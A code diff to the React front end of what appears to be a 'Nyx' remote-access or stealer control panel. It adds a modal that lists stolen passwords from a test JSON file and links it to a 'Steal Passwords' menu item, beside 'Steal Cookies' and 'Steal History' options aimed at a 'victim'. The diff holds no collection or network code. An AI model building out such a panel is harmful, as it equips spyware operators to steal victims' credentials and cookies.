@@ -7,6 +7,7 @@ import prtsc from '@/assets/screenshot.png'
 import webcam from '@/assets/webcam.png'
 import { HereBackgroundGradientAnimation } from "./ui/background-gradient-animation";
 import Data from '@/data/teste.json';
+import Data2 from '@/data/teste-senhas.json'
 import { useParams } from 'next/navigation'
 import Footer from './footer/footer'
 
@@ -33,6 +34,12 @@ interface User {
   city: string;
   cep: string;
   isp: string;
+}
+
+interface Senhas {
+  id:number;
+  location: string;
+  password: string
 }
 
 interface networkDetails {
@@ -70,6 +77,7 @@ export default function Component() {
   const [webcamImage, setWebcamImage] = useState<string | null>(null);
   const [screenshotImage, setScreenshotImage] = useState<string | null>(null);
   const users: User[] = Data;
+  const senhas: Senhas[] = Data2;
 
 
 
@@ -283,8 +291,51 @@ const ImageModal: React.FC<ImageModalProps> = ({ isOpen, onClose, title, imageSr
 };
   
 
-  const ContextMenu = () => (
-    <div
+
+function ModalPassowrds() {
+  const [isModalOpenSenha, setIsModalOpenSenha] = useState<boolean>(false)
+  const handleCloseModalSenha = () => {
+    setIsModalOpenSenha(false)
+  }
+  return(
+    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
+    <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto space-y-6">
+    <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
+        <Image
+          src={logo}
+          alt="Nyx Logo"
+          width={700}
+          height={700}
+        />
+      </div>
+      {/* BotÃ£o de fechar */}
+      
+      <button onClick={handleCloseModalSenha} className=" self-start text-red-700">
+        CLOSE
+      </button>
+      <h1 className="text-3xl font-bold text-center">Passowrds</h1>
+      <div>
+        {senhas.map(({id,location,password})=>(
+           <div className="bg-zinc-900 p-4 rounded-md" key={id}>
+            <strong>{location}</strong>
+              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{password}</p>
+           </div> 
+        ))}
+      </div>
+      
+        </div>
+      </div>
+  )
+}
+
+  function ContextMenu() {
+    const [isModalOpenSenha, setIsModalOpenSenha] = useState<boolean>(false)
+    const handleOpenModalSenha = () => {
+      setIsModalOpenSenha(true)
+    }
+    return  (
+    
+      <div
       ref={contextMenuRef}
       className="absolute bg-zinc-800 border border-zinc-700 rounded shadow-lg py-1 z-50"
       style={{ top: `${contextMenu.y}px`, left: `${contextMenu.x}px` }}
@@ -301,7 +352,14 @@ const ImageModal: React.FC<ImageModalProps> = ({ isOpen, onClose, title, imageSr
             style={{ top: '0', left: '100%', minWidth: 250 }}
           >
             <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
-              <abbr className='no-underline' title='Here you can steal the user Passwords'><p>Steal Passwords</p></abbr>
+              <abbr className='no-underline' title='Here you can steal the user Passwords'>
+                <p onClick={handleOpenModalSenha}>
+                  Steal Passwords
+                  </p>
+                  <div>
+                    {isModalOpenSenha && <ModalPassowrds/>}
+                  </div>
+                </abbr>
             </div>
             <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"><abbr  title='Here you can steal the victmin Cookies'>Steal Cookies</abbr></div>
             <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"><abbr  title='Here you can steal the victmin History'>Steal History</abbr></div>
@@ -321,7 +379,11 @@ const ImageModal: React.FC<ImageModalProps> = ({ isOpen, onClose, title, imageSr
         
         </div>
     </div>
-  )
+  
+    )
+  }
+    
+   
   
   return (
     <HereBackgroundGradientAnimation>      
